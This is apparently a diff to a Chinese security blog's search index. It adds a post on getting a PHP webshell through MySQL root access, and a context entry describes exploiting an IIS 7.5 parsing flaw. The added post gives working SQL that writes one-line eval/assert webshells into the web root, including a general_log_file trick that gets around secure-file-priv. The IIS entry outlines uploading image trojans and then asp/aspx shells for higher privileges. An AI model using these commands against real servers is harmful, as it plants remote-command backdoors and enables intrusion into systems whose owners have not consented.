@@ -1,6 +1,14 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[MySQL root账号general_log_file方法获取webshell]]></title>
+    <url>%2F2018%2F02%2F06%2FMySQL-root%E8%B4%A6%E5%8F%B7general-log-file%E6%96%B9%E6%B3%95%E8%8E%B7%E5%8F%96webshell%2F</url>
+    <content type="text"><![CDATA[通过general_log和general_log_file来获取webshell网站开放了phpmyadmin，知道网站真是路径和root账号密码的情况下，最简单的getshell的方法就是直接导出webshell：1select '&lt;?php @eval($_POST["lzx"]);?&gt;' into outfile 'C:/phpStudy/WWW/1.php'; 但是今天在测试的时候发现报错了：1The MySQL server is running with the --secure-file-priv option so it cannot execute this statement 意思是MySQL开启了–secure-file-priv选项，禁止执行这条语句。 MySQL打开general_log之后，所有的查询语句都可以在general_log文件中以可读的方式得到，但是这样general_log文件会非常大，所以默认都是关闭的。有的时候为了查错等原因，还是需要暂时打开general_log的。换句话说general_log_file会记录所有的查询语句，以原始的状态来显示，如果将general_log开关打开，general_log_file设置为一个php文件，则查询的操作将会全部写入到general_log_file指定的文件，通过访问general_log_file指定的文件来获取webshell。在mysql中执行查询：123SET global general_log='on';SET global general_log_file='D:/phpStudy/WWW/cmd.php';SELECT '&lt;?php assert($_POST["cmd"]);?&gt;'; 然后访问http://www.xxx.com/cmd.php文件即可。]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+  </entry>
+  <entry>
     <title><![CDATA[IIS7.5解析php解析漏洞shell权限过低的解决办法]]></title>
     <url>%2F2018%2F01%2F30%2FIIS7-5%E8%A7%A3%E6%9E%90php%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9Eshell%E6%9D%83%E9%99%90%E8%BF%87%E4%BD%8E%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%2F</url>
     <content type="text"><![CDATA[今天在进行测试的时候，遇到一个IIS7.5的服务器，解析php脚本文件是存在解析漏洞，上传图片木马之后，配合解析漏洞getshell，发现只对上传的目录有读写权限，其他目录全部无法访问，解决的办法是上传asp或者aspx的脚本目录，能够获取到更高的权限。]]></content>
